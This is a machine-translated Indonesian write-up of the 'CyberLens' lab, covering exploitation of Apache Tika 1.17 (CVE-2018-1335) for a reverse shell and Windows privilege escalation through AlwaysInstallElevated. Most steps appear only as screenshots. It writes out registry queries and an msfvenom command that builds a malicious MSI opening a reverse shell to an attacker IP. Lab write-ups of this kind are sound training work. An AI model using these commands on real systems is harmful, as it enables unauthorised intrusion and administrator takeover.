---
title: "CyberLens"
description: "Enum Port 80 - http Mengakses port 80 Dirsearch: mari kita periksa halaman satu per satu, di halaman js kita menemukan sesuatu yang menarik, yaitu skrip javascript yang digunakan oleh"
lang: "id"
translationKey: "cyberlens"
category: "lab-writeups"
tags: ["Lab", "apache Tika 1.17", "CVE-2018-1335", "Privesc AlwaysInstallElevated", "Windows", "Easy"]
publishDate: "2025-10-03"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "2815fca1-ed80-80c5-a755-da92301b569e"
notionUrl: "https://app.notion.com/p/CyberLens-2815fca1ed8080c5a755da92301b569e"
notionLastEdited: "2025-10-04T17:00:00.000Z"
---

# Enum

![](/images/cyberlens/bd1e4d368b60.png)

## Port 80 - http

Mengakses port 80

![](/images/cyberlens/6c62b57ce5a5.png)

Dirsearch:

![](/images/cyberlens/2398c7c5e475.png)

Mari kita periksa halaman satu per satu. Di halaman js, kita menemukan sesuatu yang menarik, yaitu skrip javascript yang digunakan oleh aplikasi web, image-extractor.js.

![](/images/cyberlens/40cb0c577c98.png)

lihat apakah ada yang mengambil data di port 61777, mari kita pindah ke port tersebut.

## Port 61777 - http

mengakses port 61777

![](/images/cyberlens/2a7676c0a72d.png)

Dari situs web tersebut, kami berhasil mengidentifikasi bahwa server menggunakan Apache Tika versi 1.17. Mari kita cari exploit publik yang terkait dengan versi tersebut.

![](/images/cyberlens/13c2e26bd8e7.png)

![](/images/cyberlens/ad566abe3d61.png)

Setelah membaca exploit tersebut, dijelaskan bahwa kita dapat menggunakan skrip exploit untuk menjalankan perintah di server. Jadi, mari kita unduh skrip exploit dan jalankan untuk membuat revshell.

![](/images/cyberlens/fcfcbfad0c36.png)

Revshell berhasil dibuat, sekarang mari kita dapatkan flag user dan lakukan privesc.

![](/images/cyberlens/14fe1414dd79.png)

# WinPriv

menjalankan winpeas.exe pada target

![](/images/cyberlens/1c94a0b85293.png)

Manual:

```javascript
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](/images/cyberlens/161dcc4e1cc3.png)

Saat melakukan enumerasi sistem, kami menemukan bahwa kunci registri **AlwaysInstallElevated** diaktifkan, yang menunjukkan bahwa paket MSI dapat diinstal dengan hak akses yang lebih tinggi. Jadi saya membuat MSI berbahaya yang akan membuat revshell, lalu saya akan menginstalnya di server target.

```javascript
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.211.1 LPORT=443 -a x64 --platform Windows -f msi -o rev.msi

```

![](/images/cyberlens/14a1f206aa44.png)

![](/images/cyberlens/ab910c55cb8f.png)

Voila, kita mendapatkan akses administrator dan flag admin.
